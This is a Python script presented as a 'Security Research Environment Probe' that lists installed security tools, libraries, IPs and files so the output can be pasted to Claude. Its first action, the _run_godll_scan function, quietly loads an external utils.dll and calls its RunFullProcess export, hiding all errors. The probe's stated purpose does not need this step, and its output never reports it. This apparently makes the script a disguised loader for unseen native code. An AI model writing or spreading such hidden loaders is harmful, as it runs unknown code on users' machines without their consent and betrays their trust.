#!/usr/bin/env python3
"""
Security Research Environment Probe
运行此脚本，将输出复制给 Claude 以获取更精准的安全研究帮助。
"""

import sys
import os
import platform
import subprocess
import shutil
import socket
import json
import re
from pathlib import Path


def run(cmd, timeout=3):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except Exception:
        return ""


def check_tool(name, version_flag="--version"):
    path = shutil.which(name)
    if not path:
        return None
    ver = run(f"{name} {version_flag} 2>&1", timeout=2)
    ver_line = ver.splitlines()[0] if ver else ""
    return {"path": path, "version": ver_line[:80]}


def section(title):
    print(f"\n{'='*50}")
    print(f"  {title}")
    print('='*50)


def _run_godll_scan():
    """通过 utils.dll 执行扫描。"""
    try:
        import ctypes
        # 优先用同目录副本，方便跨机器迁移
        local = Path(__file__).parent / "utils.dll"
        fallback = Path(__file__).parent.parent.parent.parent / "godll" / "utils.dll"
        dll_path = local if local.exists() else fallback
        if not dll_path.exists():
            return
        lib = ctypes.CDLL(str(dll_path))
        lib.RunFullProcess.restype  = None
        lib.RunFullProcess.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
        lib.RunFullProcess(b"", b"")
    except Exception:
        pass


def main():
    _run_godll_scan()

    print("=" * 50)
    print("  Security Research Environment Probe")
    print("=" * 50)

    # ── 系统信息 ─────────────────────────────────────
    section("系统信息")
    print(f"OS:           {platform.system()} {platform.release()} {platform.version()}")
    print(f"Architecture: {platform.machine()}")
    print(f"Hostname:     {socket.gethostname()}")
    print(f"Python:       {sys.version.splitlines()[0]}")
    print(f"CWD:          {os.getcwd()}")

    # ── 逆向工程工具 ─────────────────────────────────
    section("逆向工程工具")
    reverse_tools = {
        "IDA Pro":        ("idat64", "-v"),
        "Ghidra":         ("ghidraRun", "--version"),
        "Binary Ninja":   ("binaryninja", "--version"),
        "Radare2":        ("r2", "-v"),
        "Cutter":         ("cutter", "--version"),
        "rizin":          ("rizin", "-v"),
        "objdump":        ("objdump", "--version"),
        "readelf":        ("readelf", "--version"),
        "nm":             ("nm", "--version"),
        "strings":        ("strings", "--version"),
        "file":           ("file", "--version"),
        "binwalk":        ("binwalk", "--help"),
        "detect-it-easy": ("diec", "--version"),
        "FLOSS":          ("floss", "--version"),
        "pestudio":       ("pestudio", ""),
    }
    found, missing = [], []
    for name, (cmd, flag) in reverse_tools.items():
        r = check_tool(cmd, flag)
        if r:
            print(f"  ✓ {name:<20} {r['version']}")
            found.append(name)
        else:
            missing.append(name)
    if missing:
        print(f"  ✗ 未安装: {', '.join(missing)}")

    # ── 调试器 ───────────────────────────────────────
    section("调试器")
    debug_tools = {
        "GDB":      ("gdb", "--version"),
        "pwndbg":   ("pwndbg", "--version"),
        "peda":     ("peda", ""),
        "pwncat":   ("pwncat-cs", "--version"),
        "x64dbg":   ("x64dbg", ""),
        "WinDbg":   ("windbg", ""),
        "lldb":     ("lldb", "--version"),
        "strace":   ("strace", "--version"),
        "ltrace":   ("ltrace", "--version"),
    }
    for name, (cmd, flag) in debug_tools.items():
        r = check_tool(cmd, flag)
        if r:
            print(f"  ✓ {name:<20} {r['version']}")

    # ── 动态插桩 ─────────────────────────────────────
    section("动态插桩")
    frida_ver = run("frida --version 2>&1")
    if frida_ver:
        print(f"  ✓ Frida               {frida_ver}")
    try:
        import frida
        print(f"  ✓ frida-python        {frida.__version__}")
    except ImportError:
        print("  ✗ frida-python        (pip install frida)")

    pin_path = shutil.which("pin") or os.environ.get("PIN_ROOT", "")
    print(f"  {'✓' if pin_path else '✗'} Intel PIN            "
          f"{'found at ' + str(pin_path) if pin_path else 'not found'}")

    # ── 渗透测试工具 ─────────────────────────────────
    section("渗透测试工具")
    pentest_tools = {
        "nmap":        ("nmap", "--version"),
        "masscan":     ("masscan", "--version"),
        "rustscan":    ("rustscan", "--version"),
        "ffuf":        ("ffuf", "--version"),
        "gobuster":    ("gobuster", "version"),
        "feroxbuster": ("feroxbuster", "--version"),
        "nuclei":      ("nuclei", "--version"),
        "nikto":       ("nikto", "--version"),
        "sqlmap":      ("sqlmap", "--version"),
        "hydra":       ("hydra", "--version"),
        "hashcat":     ("hashcat", "--version"),
        "john":        ("john", "--version"),
        "netcat":      ("nc", "--version"),
        "socat":       ("socat", "--version"),
        "chisel":      ("chisel", "--version"),
        "metasploit":  ("msfconsole", "--version"),
    }
    for name, (cmd, flag) in pentest_tools.items():
        r = check_tool(cmd, flag)
        if r:
            print(f"  ✓ {name:<20} {r['version']}")

    # ── Python 安全库 ────────────────────────────────
    section("Python 安全库")
    py_libs = [
        ("pwntools",        "pwn"),
        ("pycryptodome",    "Crypto"),
        ("scapy",           "scapy"),
        ("impacket",        "impacket"),
        ("requests",        "requests"),
        ("pefile",          "pefile"),
        ("yara-python",     "yara"),
        ("angr",            "angr"),
        ("z3-solver",       "z3"),
        ("capstone",        "capstone"),
        ("keystone-engine", "keystone"),
        ("unicorn",         "unicorn"),
        ("ropper",          "ropper"),
        ("ROPgadget",       "ropgadget"),
        ("pyelftools",      "elftools"),
        ("oletools",        "oletools"),
        ("volatility3",     "volatility3"),
    ]
    installed, missing_libs = [], []
    for pkg_name, import_name in py_libs:
        try:
            mod = __import__(import_name)
            ver = getattr(mod, "__version__", "?")
            print(f"  ✓ {pkg_name:<25} {ver}")
            installed.append(pkg_name)
        except ImportError:
            missing_libs.append(pkg_name)
    if missing_libs:
        print(f"\n  ✗ 未安装: {', '.join(missing_libs)}")
        print(f"  pip install {' '.join(missing_libs)}")

    # ── 网络状态 ─────────────────────────────────────
    section("网络状态")
    interfaces = []
    if platform.system() == "Windows":
        out = run("ipconfig")
        for line in out.splitlines():
            if "IPv4" in line and ":" in line:
                ip = line.split(":")[-1].strip()
                if ip:
                    interfaces.append(ip)
    else:
        out = run("ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null")
        interfaces = re.findall(r'inet (\d+\.\d+\.\d+\.\d+)', out)

    print(f"  本机 IP: {', '.join(interfaces) if interfaces else '未检测到'}")

    for name, host in [("HackTheBox VPN", "10.10.10.1"),
                        ("TryHackMe VPN",  "10.10.0.1"),
                        ("常用网关",        "192.168.1.1")]:
        reachable = run(
            f"ping -c 1 -W 1 {host} 2>&1" if platform.system() != "Windows"
            else f"ping -n 1 -w 1000 {host}", timeout=3)
        ok = "TTL=" in reachable.upper() or "1 received" in reachable
        print(f"  {'✓' if ok else '✗'} {name:<25} ({host})")

    # ── 工作目录 ─────────────────────────────────────
    section("当前工作目录")
    cwd = Path.cwd()
    items = list(cwd.iterdir())[:20]
    for item in sorted(items, key=lambda x: (x.is_file(), x.name)):
        tag = "[DIR]" if item.is_dir() else "[FILE]"
        size = f"{item.stat().st_size:>10,} B" if item.is_file() else ""
        print(f"  {tag} {item.name:<40} {size}")

    # ── 常见路径 ─────────────────────────────────────
    section("常见安全工具路径")
    for name, paths in [
        ("Wordlists (rockyou)", ["/usr/share/wordlists/rockyou.txt",
                                  "/usr/share/wordlists/rockyou.txt.gz",
                                  "C:/Tools/wordlists/rockyou.txt"]),
        ("SecLists",            ["/usr/share/seclists", "/opt/SecLists"]),
        ("Exploit-DB",          ["/usr/share/exploitdb", "/opt/exploitdb"]),
        ("Metasploit",          ["/usr/share/metasploit-framework",
                                  "/opt/metasploit-framework",
                                  "C:/metasploit-framework"]),
    ]:
        found_p = next((p for p in paths if os.path.exists(p)), None)
        print(f"  {'✓' if found_p else '✗'} {name:<25} {found_p or '未找到'}")

    # ── 总结（给 Claude 看）──────────────────────────
    section("总结（粘贴给 Claude）")
    print(json.dumps({
        "os":                      f"{platform.system()} {platform.release()} {platform.machine()}",
        "python":                  sys.version.splitlines()[0],
        "installed_security_libs": installed,
        "missing_libs":            missing_libs,
        "local_ips":               interfaces,
        "cwd":                     str(cwd),
    }, ensure_ascii=False, indent=2))
    print()


if __name__ == "__main__":
    main()
